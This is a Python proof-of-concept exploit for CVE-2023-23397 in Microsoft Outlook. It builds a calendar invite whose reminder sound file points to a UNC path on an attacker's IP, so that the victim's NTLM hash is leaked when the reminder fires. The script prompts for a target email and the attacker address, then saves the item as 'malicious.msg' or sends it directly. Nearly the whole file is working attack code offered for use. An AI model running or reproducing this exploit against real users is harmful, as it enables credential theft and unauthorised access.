import win32com.client
import datetime
import os
import colorama
from colorama import Fore, init
init(autoreset=True)


print(Fore.LIGHTGREEN_EX+r" ____  _     _____   ____  ____  ____ _____        ____ _____ _____  ____  ____  ")
print(Fore.LIGHTGREEN_EX+r"/   _\/ \ |\/  __/  /_   \/  _ \/_   \\__  \      /_   \\__  \\__  \/__  \/ _  \ ")
print(Fore.LIGHTGREEN_EX+r"|  /  | | //|  \     /   /| / \| /   /  /  |_____  /   /  /  |  /  ||\/  |\/ | | ")
print(Fore.LIGHTGREEN_EX+r"|  \__| \// |  /_   /   /_| \_/|/   /_ _\  |\____\/   /_ _\  | _\  |\__  |   | | ")
print(Fore.LIGHTGREEN_EX+r"\____/\__/  \____\  \____/\____/\____//____/      \____//____//____/   \_/   \_/ ")
print(Fore.GREEN+"Github"+Fore.LIGHTWHITE_EX+"     https://github.com/Pushkarup                    ")
print(Fore.GREEN+"LinkedIn"+Fore.LIGHTWHITE_EX+"   https://www.linkedin.com/in/pushkar-upadhyay    ")
print(f"{Fore.YELLOW}[PoC By PUSHKAR UPADHYAY] - {Fore.GREEN}Elevation of Privilege in Microsoft Outlook")



                                                                                

def save_mail(appt):
    try:
        export_path = 'malicious.msg'
        appt.SaveAs(os.path.abspath(export_path))
        print(Fore.LIGHTGREEN_EX+"[CVE 2023-23397]"+Fore.LIGHTWHITE_EX+" Finished, saved to", os.path.abspath(export_path))
    except Exception as e:
        print(Fore.LIGHTRED_EX+"[FAILED]"+Fore.LIGHTWHITE_EX+" Error saving email:", str(e))

def send_mail(appt):
    try:
        appt.Send()
        print(Fore.LIGHTGREEN_EX+"[CVE 2023-23397] Finished, e-mail sent!")
    except Exception as e:
        print(Fore.LIGHTRED_EX+"[FAILED] Error sending email:", str(e))

def generate_mail(target, c2, save_or_send):
    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        appt = outlook.CreateItem(1)
        print(Fore.LIGHTYELLOW_EX+"[CVE 2023-23397] Generating malicious e-mail...")

        output_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        appt.Start = output_date
        appt.AllDayEvent = True
        appt.Subject = "Testing CVE-2023-23397"
        appt.Body = "Thank you for your hash!"
        appt.Location = "INDIAN HACKERS"
        appt.MeetingStatus = 1
        appt.Recipients.Add(target)
        appt.ReminderOverrideDefault = True
        appt.ReminderPlaySound = True
        appt.ReminderSoundFile = "\\\\" + c2

        if save_or_send == "save":
            save_mail(appt)
        elif save_or_send == "send":
            send_mail(appt)
        else:
            print(Fore.LIGHTRED_EX+"[FAILED] Unrecognized command, exiting...")
    except Exception as e:
        print(Fore.LIGHTRED_EX+"[FAILED] Error:", str(e))

def main():

    try:
        target_email = input("Enter the target email address: ")
        attacker_ip = input("Enter the attacker's IP address: ")
        action = input("Choose action (save/send): ").lower()

        if action not in ["save", "send"]:
            print(Fore.LIGHTRED_EX+"[FAILED] Invalid action, exiting...")
            return

        generate_mail(target_email, attacker_ip, action)
    except Exception as e:
        print(Fore.LIGHTRED_EX+"[FAILED] An unexpected error occurred:", str(e))

if __name__ == "__main__":
    main()
